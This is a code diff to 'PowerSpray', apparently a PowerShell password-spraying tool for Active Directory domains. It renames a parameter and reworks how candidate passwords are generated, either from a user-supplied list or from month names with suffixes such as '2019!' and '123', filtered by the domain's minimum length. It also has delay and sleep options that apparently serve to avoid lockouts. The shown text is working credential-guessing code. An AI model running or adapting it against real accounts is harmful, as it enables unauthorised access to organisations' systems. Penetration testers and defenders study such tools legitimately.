@@ -25,7 +25,7 @@ function PowerSpray {
         https://social.technet.microsoft.com/wiki/contents/articles/4231.working-with-active-directory-using-powershell-adsi-adapter.aspx
         https://blog.fox-it.com/2017/11/28/further-abusing-the-badpwdcount-attribute/
         
-    .PARAMETER PasswordList
+    .PARAMETER Passwords
 
         A comma-separated list of passwords to use instead of the default list.
 
@@ -41,13 +41,13 @@ function PowerSpray {
 
         PowerSpray
         PowerSpray -Delay 1000 -Sleep 10
-        PowerSpray -PasswordList "Password1,Password2,Password1!,Password2!"
+        PowerSpray -Passwords "Password1,Password2,Password1!,Password2!"
       
     #> 
 
     param (
     	[parameter(Mandatory=$false, HelpMessage="A comma-separated list of passwords to use instead of the default list.")]
-	[string]$PasswordList,
+	[string]$Passwords,
 	[parameter(Mandatory=$false, HelpMessage="The delay time between guesses in millisecounds.")]
 	[int]$Delay,
 	[parameter(Mandatory=$false, HelpMessage="The number of minutes to sleep between password cycles.")]
@@ -79,17 +79,17 @@ function PowerSpray {
         Write-Output "[*] The Min Password Length for the current domain is $($minPwdLength)."
     }
 
-    if ($PSBoundParameters.ContainsKey('PasswordList')) {
-        $PasswordList = $PasswordList -split ',' -join "`r`n"
+    $PasswordList = @()
+    if ($PSBoundParameters.ContainsKey('Passwords')) {
+        $PasswordList = $Passwords -split ','
     } else {
-        $PasswordList = @()
         $MonthList = @((Get-Culture).DateTimeFormat.GetMonthName((Get-Date).Month-1), (Get-Culture).DateTimeFormat.GetMonthName((Get-Date).Month), (Get-Culture).DateTimeFormat.GetMonthName((Get-Date).Month+1))
         $AppendList = @("18", "19", "18!", "19!", "2018", "2019", "2018!", "2019!", "1", "2", "3", "1!", "2!", "3!", "123", "1234", "123!", "1234!")
         foreach ($Month in $MonthList)
         {
             foreach ($Item in $AppendList)
             { 
-                $Candidate = $Month + $Item + "`r`n"
+                $Candidate = $Month + $Item
                 if ($Candidate.length -ge $minPwdLength) {
                     $PasswordList += $Candidate
                 }
